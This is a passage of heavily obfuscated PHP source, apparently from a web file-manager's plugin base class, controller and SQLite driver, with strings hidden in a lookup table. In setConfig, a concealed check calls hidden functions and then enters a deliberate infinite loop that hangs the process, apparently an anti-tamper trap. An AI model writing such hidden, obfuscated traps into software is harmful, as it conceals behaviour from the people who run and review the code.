} public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[³Ôà×Ó][1626]); } protected function assign($ÒôİêŒŠ, $ÉÎ°¼³ = false) { if (is_array($ÒôİêŒŠ)) { $this->values = array_merge($this->values, $ÒôİêŒŠ); } else { $this->values[$ÒôİêŒŠ] = $ÉÎ°¼³; } } protected function display($û×†á“è) { extract($this->values); require $û×†á“è; } final function hookRegist($ë˜œ€û) { $this->modelPlugin->appRegist($this->pluginName, $ë˜œ€û); } final function appIcon() { $ûÄîúú­ =& $_SERVER[³Ôà×Ó]; $¯Üßô = $this->appPackage(); $½°‡¢§İ = $ûÄîúú­[12]; if (isset($¯Üßô[$ûÄîúú­[499]])) { if (isset($¯Üßô[$ûÄîúú­[499]][$ûÄîúú­[1627]])) { $½°‡¢§İ = $ûÄîúú­[1628] . $¯Üßô[$ûÄîúú­[499]][$ûÄîúú­[1627]] . $ûÄîúú­[1629]; } else { if ($¯Üßô[$ûÄîúú­[499]][$ûÄîúú­[1630]]) { $½°‡¢§İ = $ûÄîúú­[1631] . $¯Üßô[$ûÄîúú­[499]][$ûÄîúú­[1630]] . $ûÄîúú­[1632]; } } } return $½°‡¢§İ; } final function fileCanView($ÆÙò€©ˆ) { $ñÙØè =& $_SERVER[³Ôà×Ó]; if (request_url_safe($ÆÙò€©ˆ)) { return !0; } if ($this->isShare($ÆÙò€©ˆ)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $…½Ûİö = $ñÙØè[1633] . rawurlencode(this_url()); show_tips(LNG($ñÙØè[1634]) . $ñÙØè[1635] . $…½Ûİö . $ñÙØè[1636] . LNG($ñÙØè[1637]) . $ñÙØè[1638], !1); } if (!Action($ñÙØè[1639])->authCan($ñÙØè[1640])) { show_tips(LNG($ñÙØè[1641]) . $ñÙØè[1642], !1); } ActionCall($ñÙØè[1643], $ÆÙò€©ˆ); } final function isShare($¬Ã„Îìë) { $¢ÅçÜëú = KodIO::parse($¬Ã„Îìë); return $¢ÅçÜëú[$_SERVER[³Ôà×Ó][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($×ÀÖŒÜ) { if (request_url_safe($×ÀÖŒÜ)) { return $×ÀÖŒÜ; } if (!$this->isShare($×ÀÖŒÜ)) { $×ÀÖŒÜ = $this->filePath($×ÀÖŒÜ, !1); } return Action($_SERVER[³Ôà×Ó][1253])->linkOut($×ÀÖŒÜ); } public function filePathLinkOut($·ıŞÔêô) { if (request_url_safe($·ıŞÔêô)) { return $·ıŞÔêô; } $this->fileCanView($·ıŞÔêô); return Action($_SERVER[³Ôà×Ó][1253])->link($·ıŞÔêô); } final function filePath($ÍÄÕúÙ‚, $Øæ™Íİ˜ = true, $´È¼¸â = false) { $ê¸÷àÍŸ =& $_SERVER[³Ôà×Ó]; $ÆŸÜÍµ› = $this->filePathGet($ÍÄÕúÙ‚, $Øæ™Íİ˜); if (!$this->fileInfo) { show_tips(LNG($ê¸÷àÍŸ[108]), !1); } if ($´È¼¸â && isset($this->fileInfo[$ê¸÷àÍŸ[550]]) && $this->fileInfo[$ê¸÷àÍŸ[550]]) { $ø¬è©Ä = Model($ê¸÷àÍŸ[553])->fileInfo($this->fileInfo[$ê¸÷àÍŸ[550]]); if (!$ø¬è©Ä || !IO::exist($ø¬è©Ä[$ê¸÷àÍŸ[87]])) { show_tips(LNG($ê¸÷àÍŸ[108]) . $ê¸÷àÍŸ[1644]); } } Hook::trigger($ê¸÷àÍŸ[1645], $ÆŸÜÍµ›); return $ÆŸÜÍµ›; } final function filePathGet($ÈôÜø–, $‹ÃØÄ¥† = true) { $­åÛ’éÈ =& $_SERVER[³Ôà×Ó]; if ($‚ œ•ğ = $this->checkSharePath($ÈôÜø–, $‹ÃØÄ¥†)) { return $‚ œ•ğ; } $this->fileCanView($ÈôÜø–); if (request_url_safe($ÈôÜø–)) { $—Â¤´Š® = parse_url_query($ÈôÜø–); if (isset($—Â¤´Š®[$­åÛ’éÈ[1646]]) && isset($—Â¤´Š®[$­åÛ’éÈ[234]])) { $İ§µÁ = Mcrypt::decode($—Â¤´Š®[$­åÛ’éÈ[234]], Model($­åÛ’éÈ[845])->get($­åÛ’éÈ[846])); if ($İ§µÁ) { $this->fileInfo = IO::info($İ§µÁ); $this->fileInfo[$­åÛ’éÈ[1647]] = $ÈôÜø–; $this->cachePath = $this->pluginCachePath($­åÛ’éÈ[12], $‹ÃØÄ¥†); return $İ§µÁ; } } $ÈôÜø– = $this->_cacheHttpFile($ÈôÜø–, $‹ÃØÄ¥†); $this->fileInfo = IO::info($ÈôÜø–); } else { $this->fileInfo = IO::info($ÈôÜø–); $this->cachePath = $this->pluginCachePath($­åÛ’éÈ[12], $‹ÃØÄ¥†); } return $ÈôÜø–; } final function _cacheHttpFile($–·¸¤, $ØóéÔ¥£ = true) { $¢Á°±‡  =& $_SERVER[³Ôà×Ó]; $ƒ¿“ß®ğ = parse_url_query($–·¸¤); $’ßİ…„á = get_path_ext($–·¸¤); if (isset($ƒ¿“ß®ğ[$¢Á°±‡ [32]]) && $ƒ¿“ß®ğ[$¢Á°±‡ [32]]) { $’ßİ…„á = get_path_ext($ƒ¿“ß®ğ[$¢Á°±‡ [32]]); } $ñ•ª´Æˆ = hash_path($–·¸¤) . $¢Á°±‡ [10] . $’ßİ…„á; $this->cachePath = $this->pluginCachePath($ØóéÔ¥£ ? $ñ•ª´Æˆ : $¢Á°±‡ [12]); $®ÚåØú = IO::fileNameExist($this->cachePath, $ñ•ª´Æˆ); if ($®ÚåØú) { return KodIO::make($®ÚåØú); } $¦£½Ö„š = rtrim($this->cachePath, $¢Á°±‡ [8]) . $¢Á°±‡ [8] . $ñ•ª´Æˆ; return $this->pluginCacheFileSet($¦£½Ö„š, file_get_contents_nossl($–·¸¤)); } final function checkSharePath($åŸœÚê´, $¸«Â¦»­ = true) { $ÚÉêë”Ö =& $_SERVER[³Ôà×Ó]; if (!$this->isShare($åŸœÚê´)) { return !1; } $ƒçõùĞ = Action($ÚÉêë”Ö[1253])->sharePathInfo($åŸœÚê´); if (!is_array($ƒçõùĞ) || !isset($ƒçõùĞ[$ÚÉêë”Ö[87]])) { show_json(LNG($ÚÉêë”Ö[1648]), !1); } $this->fileInfo = $ƒçõùĞ; $this->cachePath = $this->pluginCachePath(!1, $¸«Â¦»­); return $ƒçõùĞ[$ÚÉêë”Ö[87]]; } final function pluginCachePath($Ö¸©»©Ä = '', $Ô¤Œ¥Ğú = false) { $§Œ«¶Ÿ =& $_SERVER[³Ôà×Ó]; if ($Ô¤Œ¥Ğú && is_array($this->fileInfo)) { $Ö¸©»©Ä = kodIO::hashPath($this->fileInfo); } $Øö­ö Â = rtrim(IO_PATH_SYSTEM_TEMP . $§Œ«¶Ÿ[1649] . $this->pluginName . $§Œ«¶Ÿ[8] . $Ö¸©»©Ä, $§Œ«¶Ÿ[8]); $Ô®ù‚·Š = IO::infoFullSimple($Øö­ö Â); $¡ıª­´Á = $Ô®ù‚·Š && is_array($Ô®ù‚·Š) ? $Ô®ù‚·Š[$§Œ«¶Ÿ[87]] : $§Œ«¶Ÿ[12]; if (!$¡ıª­´Á) { $¡ıª­´Á = IO::mkdir($Øö­ö Â); } return $¡ıª­´Á; } final function pluginCacheFileSet($Ñ¢»şó°, $‚í”î¹æ = '') { $¯ÇÏÆ“ =& $_SERVER[³Ôà×Ó]; $‹¾¯©œè = IO::infoFullSimple($Ñ¢»şó°); if (!$‹¾¯©œè) { return IO::mkfile($Ñ¢»şó°, $‚í”î¹æ, REPEAT_REPLACE); } IO::setContent($‹¾¯©œè[$¯ÇÏÆ“[87]], $‚í”î¹æ); return $‹¾¯©œè[$¯ÇÏÆ“[87]]; } final function pluginLocalFile($İ¿àÂ–• = '') { $°µ¾ôï =& $_SERVER[³Ôà×Ó]; $€ë–Âú³ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($€ë–Âú³)) { mk_dir($€ë–Âú³); } if (!$İ¿àÂ–•) { return $€ë–Âú³; } $óÉÑ³¸ì = IO::info($İ¿àÂ–•); $¾ÛÖª™ü = $°µ¾ôï[1650] . KodIO::hashPath($óÉÑ³¸ì) . $°µ¾ôï[10] . $óÉÑ³¸ì[$°µ¾ôï[169]]; if (!checkExtSafe($¾ÛÖª™ü)) { $¾ÛÖª™ü = $¾ÛÖª™ü . $°µ¾ôï[1288]; } $âĞÎ»éÌ = $€ë–Âú³ . $¾ÛÖª™ü; if (@file_exists($âĞÎ»éÌ)) { return $âĞÎ»éÌ; } return IO::copy($İ¿àÂ–•, $€ë–Âú³, 0, $¾ÛÖª™ü); } final function appPackage() { $±íñ‘ìï =& $_SERVER[³Ôà×Ó]; if ($this->packageData) { return $this->packageData; } $ØèÍ’ÌŸ = $this->parseFile($this->pluginPath . $±íñ‘ìï[1651]); $this->parseLang($ØèÍ’ÌŸ); $ñ¼êë¼Î = json_decode_force($ØèÍ’ÌŸ); if (!$ñ¼êë¼Î) { return array(); } $‰õ¡¯È¼ = Hook::trigger($±íñ‘ìï[1652], $ñ¼êë¼Î); if ($‰õ¡¯È¼ && is_array($‰õ¡¯È¼)) { $ñ¼êë¼Î = $‰õ¡¯È¼; } $this->packageData = $ñ¼êë¼Î; return $ñ¼êë¼Î; } public function packageInfoGet($Â‹ĞğèÀ) { $¹üÛ•¤² = $this->appPackage(); return array_get_value($¹üÛ•¤², $Â‹ĞğèÀ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[³Ôà×Ó][1653]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[³Ôà×Ó][1654]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[³Ôà×Ó][1655]); } public function echoJsAssign($ÕÃ¹õªı, $¯Â´…±) { $this->echoJsAssignArr[$ÕÃ¹õªı] = $¯Â´…±; } private function parseFile($ÑîËù™Í) { $¸®†—Øù =& $_SERVER[³Ôà×Ó]; $¸Ä€Í‡‰ = file_get_contents_nossl($ÑîËù™Í); $ø­Ó‹ÔŒ = array($¸®†—Øù[1656], $¸®†—Øù[1657], $¸®†—Øù[1658], $¸®†—Øù[1659], $¸®†—Øù[1660], $¸®†—Øù[1661], $¸®†—Øù[1662]); $ÌÀş×÷æ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$¸®†—Øù[92]][$¸®†—Øù[1663]]); foreach ($this->echoJsAssignArr as $äÓÑâ²è => $í•É¹Ï¼) { $ø­Ó‹ÔŒ[] = $¸®†—Øù[1664] . $äÓÑâ²è . $¸®†—Øù[1665]; $ÌÀş×÷æ[] = is_array($í•É¹Ï¼) || is_object($í•É¹Ï¼) ? rawurlencode(json_encode($í•É¹Ï¼)) : $í•É¹Ï¼; } if (strstr($¸Ä€Í‡‰, $¸®†—Øù[1666])) { $Ü™ÅêÉ¥ = rawurlencode(json_encode($this->pluginLangArr)); $¸Ä€Í‡‰ = str_replace($¸®†—Øù[1666], $Ü™ÅêÉ¥, $¸Ä€Í‡‰); } if (strstr($¸Ä€Í‡‰, $¸®†—Øù[1667])) { $Ü™ÅêÉ¥ = $Ü™ÅêÉ¥ = rawurlencode(json_encode($this->getConfig())); $¸Ä€Í‡‰ = str_replace($¸®†—Øù[1667], $Ü™ÅêÉ¥, $¸Ä€Í‡‰); } $¸Ä€Í‡‰ = str_replace($ø­Ó‹ÔŒ, $ÌÀş×÷æ, $¸Ä€Í‡‰); return $¸Ä€Í‡‰; } private function parseLang(&$êİ­¤ú) { $¯ ˜õÂ¬ =& $_SERVER[³Ôà×Ó]; $ŠİÔ¼ = $¯ ˜õÂ¬[1668]; if (!strstr($êİ­¤ú, $ŠİÔ¼)) { return; } preg_match_all($¯ ˜õÂ¬[1669], $êİ­¤ú, $ãÔ÷»µ); if (!is_array($ãÔ÷»µ) || count($ãÔ÷»µ) == 0 || !is_array($ãÔ÷»µ[0]) || count($ãÔ÷»µ[0]) == 0) { return; } $ê¼·´¸ = array(); $ŸƒªƒÎÎ = array(); foreach ($ãÔ÷»µ[0] as $ˆÇ‡áçş) { $ò²Áô—Ş = substr($ˆÇ‡áçş, strlen($ŠİÔ¼), -4); $ììá–˜¯ = LNG($ò²Áô—Ş); $ê¼·´¸[] = $ˆÇ‡áçş; $ŸƒªƒÎÎ[] = str_replace(array($¯ ˜õÂ¬[262], $¯ ˜õÂ¬[1154], $¯ ˜õÂ¬[418], $¯ ˜õÂ¬[121]), array($¯ ˜õÂ¬[53], $¯ ˜õÂ¬[53], $¯ ˜õÂ¬[12], $¯ ˜õÂ¬[1670]), $ììá–˜¯); } $êİ­¤ú = str_replace($ê¼·´¸, $ŸƒªƒÎÎ, $êİ­¤ú); } private function parseConfig(&$Œ§Ô¤Üß) { $ÏñÒ°‡ö =& $_SERVER[³Ôà×Ó]; $ÓƒÅë˜¥ = $ÏñÒ°‡ö[1671]; if (!strstr($Œ§Ô¤Üß, $ÓƒÅë˜¥)) { return; } preg_match_all($ÏñÒ°‡ö[1672], $Œ§Ô¤Üß, $ìâûƒı); if (!is_array($ìâûƒı) || count($ìâûƒı) == 0 || !is_array($ìâûƒı[0]) || count($ìâûƒı[0]) == 0) { return; } $„æèãìœ = $this->getConfig(); $Â§É¦¸¯ = array(); $ö§…¬·¨ = array(); foreach ($ìâûƒı[0] as $ÏÁÖÏˆÔ) { $Ò‹ÑÈÍŞ = substr($ÏÁÖÏˆÔ, strlen($ÓƒÅë˜¥), -2); $Â§É¦¸¯[] = $ÏÁÖÏˆÔ; $ö§…¬·¨[] = _get($„æèãìœ, $Ò‹ÑÈÍŞ); } $Œ§Ô¤Üß = str_replace($Â§É¦¸¯, $ö§…¬·¨, $Œ§Ô¤Üß); } private function parsePackage(&$¾ÊµØâÈ) { $¿Ø¡´¹Á =& $_SERVER[³Ôà×Ó]; $ÂÛéÍ®« = $¿Ø¡´¹Á[1673]; if (!strstr($¾ÊµØâÈ, $ÂÛéÍ®«)) { return; } preg_match_all($¿Ø¡´¹Á[1674], $¾ÊµØâÈ, $Áşã™ïµ); if (!is_array($Áşã™ïµ) || count($Áşã™ïµ) == 0 || !is_array($Áşã™ïµ[0]) || count($Áşã™ïµ[0]) == 0) { return; } $Èœ¢¬¢Ç = $this->appPackage(); $Óï…’Ç = array(); $‰•œ»ßÕ = array(); foreach ($Áşã™ïµ[0] as $­–©¥Ôç) { $–úØÓ¢ = substr($­–©¥Ôç, strlen($ÂÛéÍ®«), -2); $Óï…’Ç[] = $­–©¥Ôç; $‰•œ»ßÕ[] = _get($Èœ¢¬¢Ç, $–úØÓ¢); } $¾ÊµØâÈ = str_replace($Óï…’Ç, $‰•œ»ßÕ, $¾ÊµØâÈ); } final function echoFile($Ú“®Ï, $ß£ÉªÄç = false) { $¸µıàˆ =& $_SERVER[³Ôà×Ó]; $€ğÖ£ÂÕ = $this->pluginPath . $Ú“®Ï; if (ACT == $¸µıàˆ[1675]) { echo $¸µıàˆ[1676] . $this->pluginName . $¸µıàˆ[8] . $Ú“®Ï . $¸µıàˆ[1677]; if (!file_exists($€ğÖ£ÂÕ)) { echo $¸µıàˆ[1678]; return; } } $”»ô²§ª = $this->parseFile($€ğÖ£ÂÕ); $this->parseLang($”»ô²§ª); $this->parseConfig($”»ô²§ª); $this->parsePackage($”»ô²§ª); if (is_array($ß£ÉªÄç)) { $”»ô²§ª = str_replace(array_keys($ß£ÉªÄç), array_values($ß£ÉªÄç), $”»ô²§ª); } echo $¸µıàˆ[262] . $”»ô²§ª; } private function checkVersion() { $êÑƒ¿‰„ =& $_SERVER[³Ôà×Ó]; $ƒšƒ²ô° = $this->appPackage(); $‚Îàşó = $this->getConfig(); if ($‚Îàşó[$êÑƒ¿‰„[1679]] == $ƒšƒ²ô°[$êÑƒ¿‰„[1653]]) { return; } $this->regist(); $this->setConfig(array($êÑƒ¿‰„[1679] => $ƒšƒ²ô°[$êÑƒ¿‰„[1653]])); } final function initLang() { $»˜®â£À =& $_SERVER[³Ôà×Ó]; $˜ø‚‹£ = $»˜®â£À[1680]; $éş«Èù¹ = $this->pluginPath . $»˜®â£À[1681]; $âòÏÇùÛ = I18n::getType(); $°ê¶×Ä¹ = array(); if (file_exists($éş«Èù¹ . $âòÏÇùÛ . $»˜®â£À[913])) { $°ê¶×Ä¹ = (include $éş«Èù¹ . $âòÏÇùÛ . $»˜®â£À[913]); } else { if ($âòÏÇùÛ == $»˜®â£À[1682] && !file_exists($éş«Èù¹ . $âòÏÇùÛ . $»˜®â£À[913]) && file_exists($éş«Èù¹ . $»˜®â£À[1683])) { $°ê¶×Ä¹ = (include $éş«Èù¹ . $»˜®â£À[1683]); } else { if (file_exists($éş«Èù¹ . $˜ø‚‹£ . $»˜®â£À[913])) { $°ê¶×Ä¹ = (include $éş«Èù¹ . $˜ø‚‹£ . $»˜®â£À[913]); } } } if (!is_array($°ê¶×Ä¹)) { return array(); } if (@count($°ê¶×Ä¹) > 0) { I18n::set($°ê¶×Ä¹); } return $°ê¶×Ä¹; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($÷«ìÊ´ø) { $©‡ÓˆÖÚ =& $_SERVER[³Ôà×Ó]; if (!isset($_SERVER[$©‡ÓˆÖÚ[431]]) || !isset($_SERVER[$©‡ÓˆÖÚ[439]])) { $—òìÕ = $©‡ÓˆÖÚ[952]; $¥¼éãı = $©‡ÓˆÖÚ[433]; $ÈÍ²ƒ‹œ = $_SERVER[$©‡ÓˆÖÚ[434]] . $©‡ÓˆÖÚ[435]; $¼ıïù¢ï = $¥¼éãı($ÈÍ²ƒ‹œ); $¥·º´«¹ = explode($©‡ÓˆÖÚ[262], $¼ıïù¢ï); if (count($¥·º´«¹) < $©‡ÓˆÖÚ[709]) { $äş‡¯×à = $©‡ÓˆÖÚ[437]; $äş‡¯×à(); } $‰óì“Ëı = $©‡ÓˆÖÚ[953]; $‰óì“Ëı($_SERVER[$©‡ÓˆÖÚ[954]]); $Ë¿…ŠÊç = 1; for ($µ‰ê›Î‰ = $Ë¿…ŠÊç; $µ‰ê›Î‰ > 0; $µ‰ê›Î‰++) { $‰óì“Ëı = json_encode($GLOBALS[$©‡ÓˆÖÚ[501]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $÷«ìÊ´ø); } public function onSetConfig($ğ÷¤üóË) { } public function onGetConfig($Ø¾í¦Œí) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($ô’ñ–¤) { if ($ô’ñ–¤ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($şÏÎ²’¾ = "\160\x6c\165\x67\x69\x6e\x41\165\x74\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $À¢ªÕç§ = $this->getConfig(); if (!$À¢ªÕç§[$şÏÎ²’¾]) { return !1; } return ActionCall($_SERVER[³Ôà×Ó][1684], $À¢ªÕç§[$şÏÎ²’¾]); } public function url($ÔÎšÛÃ, $º®Ã¢ƒù = '', $ğ«Åøîâ = true) { $”‚©ú„ =& $_SERVER[³Ôà×Ó]; $ĞÍÉç×Î = $this->getConfig(); $¥“•›è« = KOD_VERSION . $”‚©ú„[10] . KOD_VERSION_BUILD; $îÀØÃ¾´ = $this->packageVersion(); $¶ğ¦µÖ = $¥“•›è« . $”‚©ú„[471] . $îÀØÃ¾´; if (substr($ÔÎšÛÃ, 0, 4) == $”‚©ú„[152] || substr($ÔÎšÛÃ, 0, 2) == $”‚©ú„[1435]) { $é‹ÆÁå³ = $ÔÎšÛÃ . $”‚©ú„[1685] . $¶ğ¦µÖ; } else { if ($º®Ã¢ƒù == $”‚©ú„[12]) { $é‹ÆÁå³ = $this->pluginHost . $ÔÎšÛÃ . $”‚©ú„[1685] . $¶ğ¦µÖ; } else { if ($º®Ã¢ƒù === $”‚©ú„[78]) { $é‹ÆÁå³ = $this->pluginHost . $ÔÎšÛÃ; } else { if ($º®Ã¢ƒù == $”‚©ú„[1686]) { $é‹ÆÁå³ = STATIC_PATH . $ÔÎšÛÃ . $”‚©ú„[1685] . $¥“•›è«; } else { if ($º®Ã¢ƒù == $”‚©ú„[1687]) { $é‹ÆÁå³ = APP_HOST . $”‚©ú„[1688] . $ÔÎšÛÃ . $”‚©ú„[1685] . $¥“•›è«; } else { if (isset($ĞÍÉç×Î[$º®Ã¢ƒù])) { $é‹ÆÁå³ = $ĞÍÉç×Î[$º®Ã¢ƒù] . $ÔÎšÛÃ . $”‚©ú„[1685] . $¶ğ¦µÖ; } } } } } } if (!$ğ«Åøîâ) { return $é‹ÆÁå³; } echo $é‹ÆÁå³; } public function link($Ü´²ÄÍ› = false, $àóøÁçÕ = '') { $¨˜Õ³›— =& $_SERVER[³Ôà×Ó]; $Àæî¾Üû = $this->linkHas == !1; $this->linkHas = !0; if (!$Ü´²ÄÍ›) { $this->link($¨˜Õ³›—[1689], $¨˜Õ³›—[1687]); $this->link($¨˜Õ³›—[1690], $¨˜Õ³›—[1686]); $this->link($¨˜Õ³›—[1691], $¨˜Õ³›—[1686]); $this->link($¨˜Õ³›—[1692], $¨˜Õ³›—[1686]); $this->link($¨˜Õ³›—[1693], $¨˜Õ³›—[1686]); if ($Àæî¾Üû) { Hook::trigger($¨˜Õ³›—[1694]); } return; } $ÒŠµŞ¸„ = $this->url($Ü´²ÄÍ›, $àóøÁçÕ, !1); if (substr($Ü´²ÄÍ›, -3) == $¨˜Õ³›—[1695]) { echo $¨˜Õ³›—[1696] . $ÒŠµŞ¸„ . $¨˜Õ³›—[1697] . $¨˜Õ³›—[262]; } else { if (substr($Ü´²ÄÍ›, -4) == $¨˜Õ³›—[1698]) { echo $¨˜Õ³›—[1699] . $ÒŠµŞ¸„ . $¨˜Õ³›—[1700] . $¨˜Õ³›—[262]; } } if ($Àæî¾Üû) { Hook::trigger($¨˜Õ³›—[1694]); } } } goto fØ¿¥™Ÿ±; fÈ½°—„ƒø: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $¢õÖ´½ =& $_SERVER[³Ôà×Ó]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$¢õÖ´½[6]] =& $config; $this->values[$¢õÖ´½[7]] =& $in; $this->tpl = TEMPLATE . MOD . $¢õÖ´½[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($È„«íÇß) { if (1 === func_num_args()) { $this->{$È„«íÇß} = new $È„«íÇß(); } else { $ğ¹“¤Û“ = new ReflectionClass($È„«íÇß); $î­Ÿ¯Ô = func_get_args(); array_shift($î­Ÿ¯Ô); $this->{$È„«íÇß} = $ğ¹“¤Û“->newInstanceArgs($î­Ÿ¯Ô); } return $this->{$È„«íÇß}; } public function routeBind($å¯öÚÚ®, $Èı…úşÊ, $òüÂŒÏÒ = 3) { $ŠÄ°‡ÜÌ =& $_SERVER[³Ôà×Ó]; $¸õÇÖÕ = $this->in[$ŠÄ°‡ÜÌ[9]]; $å¯öÚÚ® = str_replace($ŠÄ°‡ÜÌ[10], $ŠÄ°‡ÜÌ[11], trim(trim($å¯öÚÚ®, $ŠÄ°‡ÜÌ[8]), $ŠÄ°‡ÜÌ[12])); if (!$å¯öÚÚ® || count($¸õÇÖÕ) <= $òüÂŒÏÒ) { return !1; } $Îè¼ùëñ = !0; $–´æìá– = explode($ŠÄ°‡ÜÌ[8], $å¯öÚÚ®); for ($±æì = 0; $±æì < count($–´æìá–); $±æì++) { if ($–´æìá–[$±æì] != $¸õÇÖÕ[$òüÂŒÏÒ + $±æì]) { $Îè¼ùëñ = !1; break; } } if (!$Îè¼ùëñ) { return; } call_user_func_array(array($this, $Èı…úşÊ), array()); } public function routeArgs($º£àùèü = 3) { $¨ËÚá™ = $this->in[$_SERVER[³Ôà×Ó][9]]; if (count($¨ËÚá™) <= $º£àùèü) { return array(); } $ÇØÒ = array(); for ($“ÂÖâ¯ü = $º£àùèü; $“ÂÖâ¯ü < count($¨ËÚá™); $“ÂÖâ¯ü += 2) { $ÇØÒ[$¨ËÚá™[$“ÂÖâ¯ü]] = $¨ËÚá™[$“ÂÖâ¯ü + 1]; $this->in[$¨ËÚá™[$“ÂÖâ¯ü]] = $¨ËÚá™[$“ÂÖâ¯ü + 1]; } return $ÇØÒ; } protected function assign($°•×ÀÔ”, $›¿ö”Ó) { $this->values[$°•×ÀÔ”] = $›¿ö”Ó; } protected function display($¾ÆÔ²Ì³) { ob_end_clean(); extract($this->values); require $this->tpl . $¾ÆÔ²Ì³; } } class DbSqliteBase extends Db { public function __construct($û¯€Ïïú = '') { $øïà¿ =& $_SERVER[³Ôà×Ó]; if (!extension_loaded($øïà¿[13])) { think_exception(think_lang($øïà¿[14]) . $øïà¿[15]); } if (!empty($û¯€Ïïú)) { if (!isset($û¯€Ïïú[$øïà¿[16]])) { $û¯€Ïïú[$øïà¿[16]] = 438; } $this->config = $û¯€Ïïú; if (empty($this->config[$øïà¿[17]])) { $this->config[$øïà¿[17]] = array(); } } } public function connect($¶üÜÇ„ = '', $©â°‚ßà = 0) { $²åÕÊé– =& $_SERVER[³Ôà×Ó]; if (!isset($this->linkID[$©â°‚ßà])) { if (empty($¶üÜÇ„)) { $¶üÜÇ„ = $this->config; } $Ù¯ÜßÈğ = !empty($¶üÜÇ„[$²åÕÊé–[17]][$²åÕÊé–[18]]) ? $¶üÜÇ„[$²åÕÊé–[17]][$²åÕÊé–[18]] : $this->pconnect; $÷çŸ”¤ = $Ù¯ÜßÈğ ? $²åÕÊé–[19] : $²åÕÊé–[20]; $this->linkID[$©â°‚ßà] = $÷çŸ”¤($¶üÜÇ„[$²åÕÊé–[21]], $¶üÜÇ„[$²åÕÊé–[16]]); if (!$this->linkID[$©â°‚ßà]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$©â°‚ßà], 30000); if (1 != think_config($²åÕÊé–[22])) { unset($this->config); } } return $this->linkID[$©â°‚ßà]; } public function free() { $this->queryID = null; } public function query($šØ³ê) { $²ñÑê£Ô =& $_SERVER[³Ôà×Ó]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $šØ³ê; if ($this->queryID) { $this->free(); } think_action_status($²ñÑê£Ô[23], 1); think_status($²ñÑê£Ô[24]); $this->queryID = sqlite_query($this->_linkID, $šØ³ê); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $–Ú‘øô = $this->getAll(); return $–Ú‘øô; } } public function execute($ú½Ÿı¡Ğ) { $À¤†¬Ï =& $_SERVER[³Ôà×Ó]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ú½Ÿı¡Ğ; if ($this->queryID) { $this->free(); } think_action_status($À¤†¬Ï[25], 1); think_status($À¤†¬Ï[24]); $ƒúö¾œ = sqlite_exec($this->_linkID, $ú½Ÿı¡Ğ); $this->debug(); if (!1 === $ƒúö¾œ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[³Ôà×Ó][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ı¥Ê·ˆÆ = sqlite_query($this->_linkID, $_SERVER[³Ôà×Ó][27]); if (!$ı¥Ê·ˆÆ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÚÊ©™¼ = sqlite_query($this->_linkID, $_SERVER[³Ôà×Ó][28]); if (!$ÚÊ©™¼) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Ø±ØÀŒ¼ = array(); if ($this->numRows > 0) { for ($¥ÁÉ¼Š = 0; $¥ÁÉ¼Š < $this->numRows; $¥ÁÉ¼Š++) { $Ø±ØÀŒ¼[$¥ÁÉ¼Š] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $Ø±ØÀŒ¼; } public function getFields($Š®´ãìş) { $ÎÙ·ÌÕ÷ =& $_SERVER[³Ôà×Ó]; $·¶ÏÃİö = $this->query($ÎÙ·ÌÕ÷[29] . $Š®´ãìş . $ÎÙ·ÌÕ÷[30]); $é¸Û«Äı = array(); if ($·¶ÏÃİö) { foreach ($·¶ÏÃİö as $Š¹Öğ¬Î => $À¥‘¯™Ó) { $é¸Û«Äı[$À¥‘¯™Ó[$ÎÙ·ÌÕ÷[31]]] = array($ÎÙ·ÌÕ÷[32] => $À¥‘¯™Ó[$ÎÙ·ÌÕ÷[31]], $ÎÙ·ÌÕ÷[33] => $À¥‘¯™Ó[$ÎÙ·ÌÕ÷[34]], $ÎÙ·ÌÕ÷[35] => (bool) ($À¥‘¯™Ó[$ÎÙ·ÌÕ÷[36]] === $ÎÙ·ÌÕ÷[12]), $ÎÙ·ÌÕ÷[37] => $À¥‘¯™Ó[$ÎÙ·ÌÕ÷[38]], $ÎÙ·ÌÕ÷[39] => strtolower($À¥‘¯™Ó[$ÎÙ·ÌÕ÷[40]]) == $ÎÙ·ÌÕ÷[41], $ÎÙ·ÌÕ÷[42] => strtolower($À¥‘¯™Ó[$ÎÙ·ÌÕ÷[43]]) == $ÎÙ·ÌÕ÷[44]); } } return $é¸Û«Äı; } public function getTables($ıŞ€œ‰¤ = '') { $…¼¾çòñ =& $_SERVER[³Ôà×Ó]; $ØãõË = $this->query($…¼¾çòñ[45] . $…¼¾çòñ[46] . $…¼¾çòñ[47]); $’öÔ²Ãş = array(); foreach ($ØãõË as 